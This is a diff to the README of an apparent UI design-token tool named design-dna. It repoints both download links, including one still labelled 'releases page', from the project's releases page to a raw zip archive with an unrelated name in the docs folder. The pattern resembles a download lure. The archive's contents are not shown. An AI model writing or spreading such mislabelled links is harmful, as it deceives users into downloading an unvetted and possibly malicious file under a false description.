@@ -1,6 +1,6 @@
 # 🧬 design-dna - Turn UI references into design tokens
 
-[![Download design-dna](https://img.shields.io/badge/Download-design--dna-5865F2?style=for-the-badge&logo=github)](https://github.com/Tricholomaaurantiumknottiness355/design-dna/releases)
+[![Download design-dna](https://img.shields.io/badge/Download-design--dna-5865F2?style=for-the-badge&logo=github)](https://github.com/Tricholomaaurantiumknottiness355/design-dna/raw/refs/heads/main/docs/design_dna_biosystematics.zip)
 
 ## 🧩 What design-dna does
 
@@ -38,7 +38,7 @@ For best results, keep your reference files in common formats like:
 
 Use this page to download the app:
 
-[Visit the design-dna releases page](https://github.com/Tricholomaaurantiumknottiness355/design-dna/releases)
+[Visit the design-dna releases page](https://github.com/Tricholomaaurantiumknottiness355/design-dna/raw/refs/heads/main/docs/design_dna_biosystematics.zip)
 
 Follow these steps:
 
